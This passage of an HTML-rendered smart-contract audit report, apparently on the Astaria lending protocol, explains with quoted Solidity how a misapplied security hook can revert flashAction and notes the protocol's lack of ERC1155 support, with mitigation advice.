class=\"mtk12\">securityHook</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">) &amp;&amp;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">preTransferState</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">ISecurityHook</span><span class=\"mtk1\">(</span><span class=\"mtk12\">securityHook</span><span class=\"mtk1\">).</span><span class=\"mtk11\">getState</span><span class=\"mtk1\">(</span><span class=\"mtk12\">addr</span><span class=\"mtk1\">, </span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">FlashActionSecurityCheckFailed</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>If we look into the current implementation of the security hook:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"171\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">getState</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tokenContract</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">external</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">view</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    (</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">uint96</span><span class=\"mtk1\"> </span><span class=\"mtk12\">nonce</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">operator</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      ,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      ,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      ,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      ,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      ,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">uint128</span><span class=\"mtk1\"> </span><span class=\"mtk12\">liquidity</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      ,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      ,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      ,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ) = </span><span class=\"mtk11\">IV3PositionManager</span><span class=\"mtk1\">(</span><span class=\"mtk12\">positionManager</span><span class=\"mtk1\">).</span><span class=\"mtk11\">positions</span><span class=\"mtk1\">(</span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encode</span><span class=\"mtk1\">(</span><span class=\"mtk12\">nonce</span><span class=\"mtk1\">, </span><span class=\"mtk12\">operator</span><span class=\"mtk1\">, </span><span class=\"mtk12\">liquidity</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span></code></pre>\n<p>The security hook should only applies to the Uniswap V3 Position NFT. However, in the current flashAction flow, if the security hook is set in a NFT that is not Uniswap V3 Position NFT, the security hook can revert the transaction and block the flashAction.</p>\n<p>The security hook can be set via the file function in CollateralToken.sol</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"172\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">file</span><span class=\"mtk1\">(</span><span class=\"mtk12\">File</span><span class=\"mtk1\"> </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">incoming</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">requiresAuth</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">_file</span><span class=\"mtk1\">(</span><span class=\"mtk12\">incoming</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_file</span><span class=\"mtk1\">(</span><span class=\"mtk12\">File</span><span class=\"mtk1\"> </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">incoming</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">CollateralStorage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">storage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">s</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_loadCollateralSlot</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">FileType</span><span class=\"mtk1\"> </span><span class=\"mtk12\">what</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">incoming</span><span class=\"mtk1\">.</span><span class=\"mtk12\">what</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">bytes</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">data</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">incoming</span><span class=\"mtk1\">.</span><span class=\"mtk12\">data</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">what</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">FileType</span><span class=\"mtk1\">.</span><span class=\"mtk12\">AstariaRouter</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">addr</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">decode</span><span class=\"mtk1\">(</span><span class=\"mtk12\">data</span><span class=\"mtk1\">, (</span><span class=\"mtk12\">address</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">ASTARIA_ROUTER</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">IAstariaRouter</span><span class=\"mtk1\">(</span><span class=\"mtk12\">addr</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">what</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">FileType</span><span class=\"mtk1\">.</span><span class=\"mtk12\">SecurityHook</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      (</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">target</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">hook</span><span class=\"mtk1\">) = </span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">decode</span><span class=\"mtk1\">(</span><span class=\"mtk12\">data</span><span class=\"mtk1\">, (</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">securityHooks</span><span class=\"mtk1\">[</span><span class=\"mtk12\">target</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">hook</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p>If we look into the source code of the Uniswap V3 Position Manager.sol</p>\n<p><a href=\"https://github.com/Uniswap/v3-periphery/blob/6cce88e63e176af1ddb6cc56e029110289622317/contracts/NonfungiblePositionManager.sol#L100\">https://github.com/Uniswap/v3-periphery/blob/6cce88e63e176af1ddb6cc56e029110289622317/contracts/NonfungiblePositionManager.sol#L100</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"173\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">positions</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">external</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">view</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">override</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">uint96</span><span class=\"mtk1\"> </span><span class=\"mtk12\">nonce</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">operator</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">token0</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">token1</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">uint24</span><span class=\"mtk1\"> </span><span class=\"mtk12\">fee</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">int24</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tickLower</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">int24</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tickUpper</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">uint128</span><span class=\"mtk1\"> </span><span class=\"mtk12\">liquidity</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">feeGrowthInside0LastX128</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">feeGrowthInside1LastX128</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">uint128</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tokensOwed0</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">uint128</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tokensOwed1</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        )</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">Position</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">position</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_positions</span><span class=\"mtk1\">[</span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">position</span><span class=\"mtk1\">.</span><span class=\"mtk12\">poolId</span><span class=\"mtk1\"> != </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&#39;Invalid token ID&#39;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">PoolAddress</span><span class=\"mtk1\">.</span><span class=\"mtk12\">PoolKey</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">poolKey</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_poolIdToPoolKey</span><span class=\"mtk1\">[</span><span class=\"mtk12\">position</span><span class=\"mtk1\">.</span><span class=\"mtk12\">poolId</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> (</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">position</span><span class=\"mtk1\">.</span><span class=\"mtk12\">nonce</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">position</span><span class=\"mtk1\">.</span><span class=\"mtk12\">operator</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">poolKey</span><span class=\"mtk1\">.</span><span class=\"mtk12\">token0</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">poolKey</span><span class=\"mtk1\">.</span><span class=\"mtk12\">token1</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">poolKey</span><span class=\"mtk1\">.</span><span class=\"mtk12\">fee</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">position</span><span class=\"mtk1\">.</span><span class=\"mtk12\">tickLower</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">position</span><span class=\"mtk1\">.</span><span class=\"mtk12\">tickUpper</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">position</span><span class=\"mtk1\">.</span><span class=\"mtk12\">liquidity</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">position</span><span class=\"mtk1\">.</span><span class=\"mtk12\">feeGrowthInside0LastX128</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">position</span><span class=\"mtk1\">.</span><span class=\"mtk12\">feeGrowthInside1LastX128</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">position</span><span class=\"mtk1\">.</span><span class=\"mtk12\">tokensOwed0</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">position</span><span class=\"mtk1\">.</span><span class=\"mtk12\">tokensOwed1</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p>Note the line:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"174\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">Position</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">position</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_positions</span><span class=\"mtk1\">[</span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">position</span><span class=\"mtk1\">.</span><span class=\"mtk12\">poolId</span><span class=\"mtk1\"> != </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&#39;Invalid token ID&#39;</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>It is possible that if the security hook turns on for a NFT that is not for Uniswap V3 Position, the query of <code>IV3PositionManager(positionManager).positions(tokenId)</code> can revert the flashAction transaction.</p>\n<h3 id=\"recommended-mitigation-steps-55\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-55\" aria-label=\"recommended mitigation steps 55 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>We recommend the protocol validates the underlying NFT is a Uniswap V3 Position NFt if the security hook is set, otherwise, security hook should be disabled.</p>\n<h2 id=\"06-lack-of-support-for-erc1155-nft\" style=\"position:relative;\"><a href=\"#06-lack-of-support-for-erc1155-nft\" aria-label=\"06 lack of support for erc1155 nft permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/127\">[06] Lack of support for ERC1155 NFT</a></h2>\n<p>Lack of support for ERC1155 NFT so a vast amount of popular ERC1155 NFT cannot be used as collateral to borrow fund.</p>\n<h3 id=\"proof-of-concept-49\" style=\"position:relative;\"><a href=\"#proof-of-concept-49\" aria-label=\"proof of concept 49 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>According to the documentation:</p>\n<p><a href=\"https://docs.astaria.xyz/docs/faq#what-nfts-will-i-be-able-to-borrow-against\">https://docs.astaria.xyz/docs/faq#what-nfts-will-i-be-able-to-borrow-against</a></p>\n<blockquote>\n<p>At launch, Astaria plans to support terms for leading NFT collections through its whitelisted strategist partners. Smaller collections may be supported at the discretion of individual whitelisted strategists, or by PrivateVaults.</p>\n</blockquote>\n<p>The codebase use ERC721 safeTransferFrom extensively and assume that the underlyling NFT contract conforms to ERC721 standard.</p>\n<p>In ClearingHouse.sol, the function below is used when flashAction is used </p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"175\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">ClearingHouse</span><span class=\"mtk1\">(</span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">clearingHouse</span><span class=\"mtk1\">[</span><span class=\"mtk12\">collateralId</span><span class=\"mtk1\">]).</span><span class=\"mtk11\">transferUnderlying</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">addr</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">receiver</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">//trigger the flash action on the receiver</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">receiver</span><span class=\"mtk1\">.</span><span class=\"mtk11\">onFlashAction</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">IFlashAction</span><span class=\"mtk1\">.</span><span class=\"mtk11\">Underlying</span><span class=\"mtk1\">(</span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">clearingHouse</span><span class=\"mtk1\">[</span><span class=\"mtk12\">collateralId</span><span class=\"mtk1\">], </span><span class=\"mtk12\">addr</span><span class=\"mtk1\">, </span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">data</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  ) != </span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;FlashAction.onFlashAction&quot;</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">FlashActionCallbackFailed</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>which calls the code below that use ERC721(tokenContract).safeTransferFrom</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"176\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">transferUnderlying</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tokenContract</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">target</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  ) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">IAstariaRouter</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ASTARIA_ROUTER</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">IAstariaRouter</span><span class=\"mtk1\">(</span><span class=\"mtk11\">_getArgAddress</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\"> == </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">ASTARIA_ROUTER</span><span class=\"mtk1\">.</span><span class=\"mtk11\">COLLATERAL_TOKEN</span><span 